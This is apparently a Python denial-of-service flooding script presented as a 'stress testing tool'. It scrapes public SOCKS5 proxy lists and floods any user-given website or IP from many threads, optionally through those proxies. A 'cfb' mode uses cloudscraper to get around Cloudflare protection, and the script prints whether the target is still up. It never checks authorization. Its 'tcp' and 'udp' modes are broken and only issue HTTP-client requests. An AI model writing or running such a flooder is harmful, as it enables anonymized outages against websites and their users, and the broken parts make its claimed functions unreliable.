import cloudscraper
import httpx
import socket
import threading
import time
import requests
import argparse
import sys
import os
from colorama import Fore, Style, init

init()

def download_proxies():
    print("Downloading public proxies...")
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
    ]

    proxy_set = set()
    for url in urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = response.text.strip().split("\n")
                proxy_set.update(proxies)
        except Exception as e:
            print(f"Failed to download proxies from {url}: {e}")

    proxy_list = list(proxy_set)
    with open("proxies.txt", "w") as proxy_file:
        proxy_file.write("\n".join(proxy_list))

    print(Fore.GREEN + f"Downloaded {len(proxy_list)} proxies." + Style.RESET_ALL)

def check_proxy(proxy):
    try:
        proxy_address = proxy.split(":")[0]
        proxy_port = int(proxy.split(":")[1])

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((proxy_address, proxy_port))

        if result == 0:
            return True
        else:
            return False
    except:
        return False

def check_proxies():
    with open("proxies.txt") as proxy_file:
        proxy_list = proxy_file.read().strip().split("\n")

    print("Checking proxies...")
    checked_proxies = []
    proxy_count = len(proxy_list)
    checked_count = 0

    def check_proxy_thread(start, end):
        nonlocal checked_proxies, checked_count

        for i in range(start, end):
            proxy = proxy_list[i]
            if check_proxy(proxy):
                checked_proxies.append(proxy)
            checked_count += 1
            sys.stdout.write(f"\rChecking proxies: {checked_count}/{proxy_count}")
            sys.stdout.flush()

    num_threads = 100
    chunk_size = proxy_count // num_threads

    threads = []
    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size if i < num_threads - 1 else proxy_count

        thread = threading.Thread(target=check_proxy_thread, args=(start, end))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    working_proxies_count = len(checked_proxies)
    non_working_proxies_count = proxy_count - working_proxies_count
    print(f"\nProxies successfully checked. Working proxies: {working_proxies_count}/{proxy_count}. Non-working proxies: {non_working_proxies_count}/{proxy_count}")

    with open("proxies.txt", "w") as proxy_file:
        proxy_file.write("\n".join(checked_proxies))

parser = argparse.ArgumentParser(description="Stress testing tool.")
parser.add_argument("-method", choices=["get", "head", "cfb", "tcp", "udp"], help="Choose the method to use.")
args, unknown_args = parser.parse_known_args()

if unknown_args and "-download" in unknown_args:
    download_proxies()
    sys.exit()

if unknown_args and "-check" in unknown_args:
    check_proxies()
    sys.exit()

method = args.method

if not method:
    method = input("Choose the method to use (get, head, cfb, tcp, udp): ")

url = None
ip = None
port = None
if method in ["get", "head", "cfb"]:
    url = input("Enter the website URL (including http or https): ")
elif method in ["tcp", "udp"]:
    ip = input("Enter the IP address of the server: ")
    port = int(input("Enter the port number: "))

num_threads = int(input("Enter the number of threads to use: "))
duration = int(input("Enter the duration of the stress test in seconds: "))

use_proxies = None

def ask_for_proxies():
    global use_proxies
    while use_proxies not in ["y", "n"]:
        use_proxies = input("Do you want to use proxies? (y/n): ").lower()

if method != "cfb":
    ask_for_proxies()

packet_size = 65507 if method == "udp" else 65535

packet_counter = 0
packet_counter_lock = threading.Lock()

def stress_test(thread_id):
    global packet_counter

    if method == "cfb":
        client = cloudscraper.create_scraper()
    else:
        if use_proxies == "y":
            with open("proxies.txt") as proxy_file:
                proxy_list = proxy_file.read().strip().split("\n")

            proxy_address = proxy_list[thread_id % len(proxy_list)]
            proxy = {"http://": f"http://{proxy_address}", "https://": f"https://{proxy_address}"}
            client = httpx.Client(proxies=proxy)
        else:
            client = httpx.Client()

    start_time = time.time()
    last_print_time = start_time - 9
    if thread_id == 0:
        if method == "cfb":
            print(Fore.YELLOW + f"Stress testing started on {url} using Cloudscraper successfully!" + Style.RESET_ALL)
        elif method in ["get", "head"]:
            print(Fore.YELLOW + f"Stress testing started on {url} with proxies: {use_proxies}" + Style.RESET_ALL)
        elif method in ["tcp", "udp"]:
            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} with proxies: {use_proxies}" + Style.RESET_ALL)

    while time.time() - start_time < duration:
        if method == "cfb":
            send_request(client)
            with packet_counter_lock:
                packet_counter += 1
        elif method in ["get", "head", "tcp", "udp"]:
            send_packet(client)
            with packet_counter_lock:
                packet_counter += 1
        if thread_id == 0 and time.time() - last_print_time >= 10:
            with packet_counter_lock:
                if method == "cfb":
                    try:
                        response_start_time = time.time()
                        response = client.get(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif method in ["get", "head"]:
                    try:
                        response_start_time = time.time()
                        response = client.get(url) if method == "get" else client.head(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif method in ["tcp", "udp"]:
                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                last_print_time = time.time()

def send_request(client):
    try:
        if method == "cfb":
            response = client.get(url)
        elif method == "get":
            response = client.get(url)
        elif method == "head":
            response = client.head(url)
    except Exception as e:
        pass

def send_packet(client):
    try:
        if method == "tcp":
            response = client.get(f"http://{ip}:{port}")
        elif method == "udp":
            response = client.get(f"udp://{ip}:{port}")
    except Exception as e:
        pass

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=stress_test, args=(i,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)

if __name__ == "__main__":
    pass
